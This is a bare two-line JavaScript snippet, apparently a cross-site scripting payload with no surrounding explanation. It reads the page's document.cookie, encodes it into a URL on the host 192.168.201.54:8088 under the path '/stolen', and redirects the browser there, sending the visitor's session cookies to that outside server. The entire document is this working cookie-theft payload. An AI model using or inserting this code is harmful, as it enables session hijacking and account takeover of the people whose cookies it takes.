var a = "http://192.168.201.54:8088/stolen?cookie=" + encodeURIComponent(document.cookie);
window.open(a,"_self");
